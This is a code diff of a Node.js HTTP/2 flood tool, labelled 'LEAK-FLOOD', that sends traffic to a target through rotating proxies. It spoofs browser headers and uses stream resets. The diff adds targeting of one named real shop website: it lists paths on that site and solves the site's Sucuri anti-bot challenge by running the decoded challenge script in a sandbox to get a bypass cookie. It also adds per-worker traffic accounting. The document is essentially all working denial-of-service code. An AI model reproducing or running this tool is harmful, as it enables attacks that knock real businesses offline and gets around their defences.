@@ -1,4 +1,4 @@
-//npm i hpack randomstring
+// npm i hpack randomstring
 const net = require("net");
 const tls = require("tls");
 const HPACK = require("hpack");
@@ -8,11 +8,14 @@ const fs = require("fs");
 const os = require("os");
 const crypto = require("crypto");
 const { exec } = require("child_process");
+const {HttpsProxyAgent} = require("https-proxy-agent");
+const axios = require("axios");
+
 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
 
 process.setMaxListeners(0);
-process.on("uncaughtException", function (e) {});
-process.on("unhandledRejection", function (e) {});
+// process.on("uncaughtException", function (e) {});
+// process.on("unhandledRejection", function (e) {});
 
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
 const debugMode = process.argv.includes("--debug");
@@ -25,6 +28,9 @@ const ratelimit = process.argv[5];
 const proxyfile = process.argv[6];
 const enableRandomPatch = process.argv[7];
 
+let totalSentBytes = 0;
+let totalReceivedBytes = 0;
+
 console.log = (...args) => {
     process.stdout.write(
         "[LOG] " + args.map(a =>
@@ -33,7 +39,6 @@ console.log = (...args) => {
         () => process.stdout.emit("flush")
     );
 };
-
 
 if (!target || !time || !threads || !proxyfile) {
     console.log(`
@@ -122,8 +127,7 @@ setInterval(printStatusCodes, 1000);
 
 function go() {
     var [proxyHost, proxyPort] = "";
-    var proxyUser = null,
-        proxyPass = null;
+    var proxyUser = null, proxyPass = null;
     const selectedProxy = pxfine[~~(Math.random() * pxfine.length)];
     const proxyParts = selectedProxy.split(":");
     if (proxyParts.length === 2) {
@@ -131,25 +135,28 @@ function go() {
     } else if (proxyParts.length === 4) {
         [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts;
     } else {
-        throw new Error("Invalid proxy format");
+        console.log(`[ERROR] Invalid proxy format: ${selectedProxy}`);
+        return;
     }
     let SocketTLS;
 
     const netSocket = net
         .connect(Number(proxyPort), proxyHost, () => {
             if (proxyUser && proxyPass) {
-                const authHeader = Buffer.from(`${proxyUser}:${proxyPass}`).toString(
-                    "base64"
-                );
-                netSocket.write(
-                    `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authHeader}\r\nProxy-Connection: Keep-Alive\r\n\r\n`
-                );
+                const authHeader = Buffer.from(`${proxyUser}:${proxyPass}`).toString("base64");
+                const connectReq = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authHeader}\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
+                totalSentBytes += Buffer.byteLength(connectReq);
+                // console.log(`[INFO] Worker ${process.pid} sent CONNECT request: ${Buffer.byteLength(connectReq)} bytes`);
+                netSocket.write(connectReq);
             } else {
-                netSocket.write(
-                    `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`
-                );
+                const connectReq = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
+                totalSentBytes += Buffer.byteLength(connectReq);
+                // console.log(`[INFO] Worker ${process.pid} sent CONNECT request: ${Buffer.byteLength(connectReq)} bytes`);
+                netSocket.write(connectReq);
             }
-            netSocket.once("data", () => {
+            netSocket.once("data", (data) => {
+                totalReceivedBytes += data.length;
+                // console.log(`[INFO] Worker ${process.pid} received CONNECT response: ${data.length} bytes`);
                 SocketTLS = tls
                     .connect(
                         {
@@ -167,8 +174,7 @@ function go() {
                                 "ECDHE-ECDSA-CHACHA20-POLY1305",
                                 "ECDHE-RSA-CHACHA20-POLY1305",
                             ].join(":"),
-                            sigalgs:
-                                "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
+                            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
                             secure: true,
                             rejectUnauthorized: false,
                             minVersion: "TLSv1.2",
@@ -203,7 +209,14 @@ function go() {
                                 encodeFrame(0, 8, Buffer.from([0x00, 0x60, 0x00, 0x00])),
                             ];
 
+                            const initialFrameBuffer = Buffer.concat(frames);
+                            totalSentBytes += initialFrameBuffer.length;
+                            // console.log(`[INFO] Worker ${process.pid} sent initial frames: ${initialFrameBuffer.length} bytes`);
+                            SocketTLS.write(initialFrameBuffer);
+
                             SocketTLS.on("data", (eventData) => {
+                                totalReceivedBytes += eventData.length;
+                                // console.log(`[INFO] Worker ${process.pid} received data: ${eventData.length} bytes`);
                                 data = Buffer.concat([data, eventData]);
 
                                 while (data.length >= 9) {
@@ -229,7 +242,10 @@ function go() {
                                             }
                                         }
                                         if (frame.type === 4 && frame.flags === 0) {
-                                            SocketTLS.write(encodeFrame(0, 4, "", 1));
+                                            const settingsAck = encodeFrame(0, 4, "", 1);
+                                            totalSentBytes += settingsAck.length;
+                                            // console.log(`[INFO] Worker ${process.pid} sent settings ACK: ${settingsAck.length} bytes`);
+                                            SocketTLS.write(settingsAck);
                                         }
                                         if (frame.type === 7 || frame.type === 5) {
                                             SocketTLS.end(() => SocketTLS.destroy());
@@ -240,9 +256,7 @@ function go() {
                                 }
                             });
 
-                            SocketTLS.write(Buffer.concat(frames));
-
-                            function main() {
+                            async function main() {
                                 if (SocketTLS.destroyed) {
                                     return;
                                 }
@@ -254,83 +268,206 @@ function go() {
                                 let ver = Math.floor(Math.random() * 99) + 1;
                                 let ver1 = Math.floor(Math.random() * 99) + 1;
                                 let ver2 = Math.floor(Math.random() * 99) + 1;
-
-                                function getRandomPath(arr) {
-                                    return arr[Math.floor(Math.random() * arr.length)];
-                                }
-
                                 const randomPath = bypassEnabled
                                     ? `/${ra()}/${ra()}`
                                     : url.pathname;
+                                let patch = `/vendor/playground`;
                                 let pathRandom = `/blog/${randomPath}?v=${Math.random()
                                     .toString(36)
                                     .substring(2)}&id=${ra()}`;
-                                let ppp = [
-                                    randomPath, pathRandom
-                                ]
-
-                                let patch = `/vendor/playground`;
                                 if (enableRandomPatch && enableRandomPatch === '--enable') {
                                     patch = pathRandom;
                                 }
-                                let cookie = "sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1";
-                                // console.log('PP: ', patch)
-                                let pDefault = `/${Math.random()
-                                    .toString(36)
-                                    .substring(2)}/${Math.random()
-                                    .toString(36)
-                                    .substring(2)}/${Math.random()
-                                    .toString(36)
-                                    .substring(2)}/${Math.random()
-                                    .toString(36)
-                                    .substring(2)}/${Math.random()
-                                    .toString(36)
-                                    .substring(2)}.js?v=${Math.random()
-                                    .toString(36)
-                                    .substring(2)}`;
+                                let cookieOfProxy = ''
+                                if (url.host.includes("bavarian-outfitters.de")) {
+                                    let linkAll = [
+                                        "/en/",
+                                        "/produkt/dirndl-inkl-bluse/",
+                                        "/produkt/lederhose/",
+                                        "/produkt/lederhose-set/",
+                                        "/produkt/haferlschuhe/",
+                                        "/lederhosenverleih-preise/",
+                                        "/lederhosenverleih-fuer-firmenkunden/",
+                                        "/kollektion/",
+                                        "/blog/",
+                                        "/kontakt/",
+                                        "/shop",
+                                        "/warenkorb-2/",
+                                        "/oeffnungszeiten",
+                                        "/lederhosenverleih-fuer-firmenkunden",
+                                        "/shop/",
+                                        "/lederhosenverleih-preise",
+                                        "/fruehlingsfest-2025-muenchen/",
+                                        "/2025/02/",
+                                        "/produkt/lederhose",
+                                        "/produkt/lederhose-set",
+                                        "/impressum/",
+                                        "/datenschutzerklaerung/",
+                                        "/en/pricing/",
+                                        "/dirndl-mieten",
+                                        "/produkt/haferlschuhe",
+                                        "/en/gallery/",
+                                        "/en/blog/",
+                                        "/category/unkategorisiert/",
+                                        "/author/constantin/",
+                                        "/fruehlingsfest-2024-uebernachtungstipps/",
+                                        "/2024/02/",
+                                        "/author/volker_quirling/",
+                                        "/lederhose-leihen/",
+                                        "/wann-beginnt-das-fruehlingsfest-2024-in-muenchen/",
+                                        "/2024/01/",
+                                        "/trachtenverleih-und-wirtshauswiesn-2020/",
+                                        "/2020/09/",
+                                        "/2016-die-wiesn-ist-vorbei/",
+                                        "/2016/10/",
+                                        "/tracht-und-kultur-in-muenchen/",
+                                        "/2016/05/",
+                                        "/go-kart-fahren-auf-dem-fruhlingsfest/",
+                                        "/2016/02/",
+                                        "/7-fakten-zur-auer-dult/",
+                                        "/oktoberfest-countdown/",
+                                        "/2016/01/",
+                                        "/blog/page/2/"
+                                    ];
+                                    function getRandomPath(arr) {
+                                        return arr[Math.floor(Math.random() * arr.length)];
+                                    }
+                                    patch = getRandomPath(linkAll);
+                                    async function getCookieByProxy(proxy, cookie = '') {
+                                        try {
+                                            // console.log(proxy)
+                                            const [host, port, user, pass] = proxy.split(':');
+                                            let agent;
+                                            if (user && pass) {
+                                                agent = new HttpsProxyAgent(`http://${user}:${pass}@${host}:${port}`);
+                                            } else {
+                                                agent = new HttpsProxyAgent(`http://${host}:${port}`);
+                                            }
+
+                                            const resp = await axios.get('https://bavarian-outfitters.de/', {
+                                                httpsAgent: agent,
+                                                timeout: 10000,
+                                                responseType: 'text',
+                                                maxRedirects: 0,               // IMPORTANT: không follow redirect
+                                                validateStatus: () => true,    // nhận tất cả status, không throw tự động
+                                                headers: {
+                                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+                                                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                                                    "Cookie": "sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; " + cookie
+                                                }
+                                            });
+                                            const html = typeof resp.data === 'string' ? resp.data : '';
+
+                                            function getCookie(html) {
+                                                // 1. Trích xuất giá trị S='...'
+                                                const re = /S\s*=\s*'([^']+)'/i;
+                                                const m = html.match(re);
+                                                if (!m) {
+                                                    console.error('Không tìm thấy chuỗi S trong HTML');
+                                                    process.exit(1);
+                                                }
+                                                const S = m[1];
+
+                                                let decoded;
+                                                try {
+                                                    decoded = Buffer.from(S, 'base64').toString('utf8');
+                                                } catch (err) {
+                                                    console.error('Lỗi khi decode Base64:', err.message);
+                                                    process.exit(1);
+                                                }
+
+
+                                                const sandbox = {
+                                                    // document: có getter/setter cookie để bắt mọi gán document.cookie = '...'
+                                                    document: {},
+                                                    location: {
+                                                        reloaded: false,
+                                                        reload: () => {
+                                                            // chặn reload thật và chỉ ghi lại là có yêu cầu reload
+                                                            sandbox.location.reloaded = true;
+                                                            // console.warn('[sandbox] location.reload() called (blocked)');
+                                                        }
+                                                    },
+                                                    console: console,
+                                                    // Cấp một vài global cần thiết (String, etc.)
+                                                    String: String,
+                                                    // Để an toàn hơn, không cung cấp eval/file system, network, process, require...
+                                                };
+
+                                                Object.defineProperty(sandbox.document, 'cookie', {
+                                                    configurable: true,
+                                                    enumerable: true,
+                                                    get: function () {
+                                                        return this._cookie || '';
+                                                    },
+                                                    set: function (val) {
+                                                        // lưu cookie vào trường _cookie và cũng ghi vào sandbox.cookieSet
+                                                        this._cookie = (this._cookie ? (this._cookie + '; ' + val) : val);
+                                                        sandbox.cookieSet = this._cookie;
+                                                        // console.log('[sandbox] document.cookie set to ->', val);
+                                                    }
+                                                });
+
+// 4. Tạo context và thực thi decoded script trong VM có timeout
+                                                const context = vm.createContext(sandbox, {name: 'sucuri-sandbox'});
+
+                                                try {
+                                                    const script = new vm.Script(decoded, {filename: 'decoded.js'});
+                                                    script.runInContext(context, {timeout: 2000}); // timeout ms
+                                                } catch (err) {
+                                                    console.error('Lỗi khi chạy script trong sandbox:', err && err.stack ? err.stack : err);
+                                                }
+
+                                                return sandbox.cookieSet.split(';')[0];
+                                            }
+
+                                            if (resp.status === 307 || /sucuri_cloudproxy_js/i.test(html)) {
+                                                // console.log('Get ccookie')
+                                                return getCookie(html);
+                                            }
+                                            return 'sucess';
+                                        } catch (err) {
+                                            // console.log(err.statusCode)
+                                            return 'error';
+                                        }
+                                    }
+                                    cookieOfProxy = await getCookieByProxy(selectedProxy, '');
+                                }
+
                                 const headers = Object.entries({
                                     ":method": "GET",
                                     ":authority": url.hostname,
                                     ":scheme": "https",
-                                    // ":path": final,
                                     ":path": patch,
-                                    // ":path": `/blog/${randomPath}?v=${Math.random()
-                                    //     .toString(36)
-                                    //     .substring(2)}&id=${ra()}`,
-                                }).concat(
-                                    Object.entries({
-                                        "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
-                                        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
-                                        "sec-ch-ua-platform": `"Windows"`,
-                                        "upgrade-insecure-requests":
-                                            Math.random() < 0.8 ? "1" : "0",
-                                        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
-                                        accept:
-                                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                                        "accept-encoding": "gzip, deflate, br, zstd",
-                                        "accept-language": `${
-                                            ["en-US", "en-GB", "ru", "fr", "de"][
-                                                Math.floor(Math.random() * 5)
-                                                ]
-                                        },q=0.${Math.floor(Math.random() * 9) + 1}`,
-                                        ...(Math.random() < 0.5 && {
-                                            cookie: `id=${ra()}; session=${ra()}; token=${ra()}; ${cookie}`,
-                                        }),
-                                        referer: `https://www.google.com/`,
-                                    })
-                                );
+                                    "cookie": `sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1; ${cookieOfProxy}`,
+                                    "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
+                                    "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
+                                    "sec-ch-ua-platform": `"Windows"`,
+                                    "upgrade-insecure-requests":
+                                        Math.random() < 0.8 ? "1" : "0",
+                                    "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
+                                    accept:
+                                        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                                    "accept-encoding": "gzip, deflate, br, zstd",
+                                    "accept-language": `${
+                                        ["en-US", "en-GB", "ru", "fr", "de"][
+                                            Math.floor(Math.random() * 5)
+                                            ]
+                                    },q=0.${Math.floor(Math.random() * 9) + 1}`,
+                                    referer: `https://www.google.com/`,
+                                });
 
                                 const headers2 = Object.entries({
                                     "sec-fetch-site": "none",
-                                    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-                                    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-                                    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
+                                    ...(Math.random() < 0.5 && {"sec-fetch-mode": "navigate"}),
+                                    ...(Math.random() < 0.5 && {"sec-fetch-user": "?1"}),
+                                    ...(Math.random() < 0.5 && {"sec-fetch-dest": "document"}),
                                 }).filter((a) => a[1] != null);
 
                                 const headers3 = Object.entries({
                                     "accept-encoding": "gzip, deflate, br, zstd",
                                     "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
-                                    ...(Math.random() < 0.5 && { cookie: `${generateNumbers}` }),
+                                    ...(Math.random() < 0.5 && {cookie: `${generateNumbers}`}),
                                     ...(Math.random() < 0.5 && {}),
                                 }).filter((a) => a[1] != null);
 
@@ -348,22 +485,23 @@ function go() {
                                     hpack.encode(combinedHeaders),
                                 ]);
 
-                                SocketTLS.write(
-                                    Buffer.concat([
-                                        encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20),
-                                    ])
-                                );
+                                const headerFrame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
+                                totalSentBytes += headerFrame.length;
+                                // console.log(`[INFO] Worker ${process.pid} sent headers frame: ${headerFrame.length} bytes`);
+                                SocketTLS.write(headerFrame);
+
                                 if (resetEnabled) {
                                     headersPerReset++;
                                     if (headersPerReset >= 10) {
-                                        SocketTLS.write(
-                                            encodeFrame(
-                                                streamId,
-                                                3,
-                                                Buffer.from([0x0, 0x0, 0x8, 0x0]),
-                                                0
-                                            )
+                                        const resetFrame = encodeFrame(
+                                            streamId,
+                                            3,
+                                            Buffer.from([0x0, 0x0, 0x8, 0x0]),
+                                            0
                                         );
+                                        totalSentBytes += resetFrame.length;
+                                        // console.log(`[INFO] Worker ${process.pid} sent reset frame: ${resetFrame.length} bytes`);
+                                        SocketTLS.write(resetFrame);
                                         headersPerReset = 0;
                                     }
                                 }
@@ -373,25 +511,34 @@ function go() {
                                     main();
                                 }, 1000 / ratelimit);
                             }
-
                             main();
                         }
                     )
-                    .on("error", () => {
+                    .on("error", (err) => {
+                        console.log(`[ERROR] TLS socket error: ${err.message}`);
                         SocketTLS.destroy();
                     });
             });
         })
-        .once("error", () => {})
-        .once("close", () => {
+        .on("error", (err) => {
+            // console.log(`[ERROR] Net socket error: ${err.message}`);
+        })
+        .on("close", () => {
             if (SocketTLS) {
                 SocketTLS.end(() => {
                     SocketTLS.destroy();
-                    //go();
                 });
             }
         });
 }
+
+// Gửi dữ liệu sử dụng từ worker sang master trước khi thoát
+process.on("exit", () => {
+    if (cluster.isWorker) {
+        // console.log(`[INFO] Worker ${process.pid} exiting with Sent: ${totalSentBytes} bytes, Received: ${totalReceivedBytes} bytes`);
+        process.send({ type: "dataUsage", sent: totalSentBytes, received: totalReceivedBytes });
+    }
+});
 
 if (cluster.isMaster) {
     console.log(`[INFO] LEAK-FLOOD starting...`);
@@ -403,15 +550,52 @@ if (cluster.isMaster) {
     console.log(`[INFO] Random patch: ${enableRandomPatch ? "ON" : "OFF"}`);
     if (bypassEnabled) console.log("[INFO] Bypass mode: ON");
     if (resetEnabled) console.log("[INFO] Reset mode: ON");
+
+    let totalSent = 0;
+    let totalReceived = 0;
+    let workersFinished = 0;
+
+    // Lắng nghe tin nhắn từ worker
+    cluster.on("message", (worker, message) => {
+        if (message.type === "dataUsage") {
+            totalSent += message.sent;
+            totalReceived += message.received;
+            // console.log(`[INFO] Received data from worker ${worker.id}: Sent ${message.sent} bytes, Received ${message.received} bytes`);
+            workersFinished++;
+            // Khi tất cả worker đã gửi dữ liệu, hiển thị tổng
+            if (workersFinished === parseInt(threads)) {
+                console.log(`[INFO] Total Data Sent: ${(totalSent / 1024 / 1024).toFixed(2)} MB`);
+                console.log(`[INFO] Total Data Received: ${(totalReceived / 1024 / 1024).toFixed(2)} MB`);
+                console.log(`[INFO] Total Data Used: ${((totalSent + totalReceived) / 1024 / 1024).toFixed(2)} MB`);
+                process.exit(1);
+            }
+        }
+    });
+
     Array.from({ length: threads }, (_, i) =>
         cluster.fork({ core: i % os.cpus().length })
     );
 
     cluster.on("exit", (worker) => {
+        // console.log(`[INFO] Worker ${worker.id} exited`);
         cluster.fork({ core: worker.id % os.cpus().length });
     });
-    setTimeout(() => process.exit(1), time * 1000);
+
+    // Thoát sau thời gian chạy
+    setTimeout(() => {
+        // Gửi tín hiệu yêu cầu worker gửi dữ liệu
+        Object.values(cluster.workers).forEach(worker => worker.send({ type: "exit" }));
+    }, time * 1000);
+
 } else {
+    // Worker lắng nghe tín hiệu exit từ master
+    process.on("message", (msg) => {
+        if (msg.type === "exit") {
+            // console.log(`[INFO] Worker ${process.pid} received exit signal`);
+            process.send({ type: "dataUsage", sent: totalSentBytes, received: totalReceivedBytes });
+            process.exit(0);
+        }
+    });
+
     setInterval(go, 1);
-    setTimeout(() => process.exit(1), time * 1000);
 }
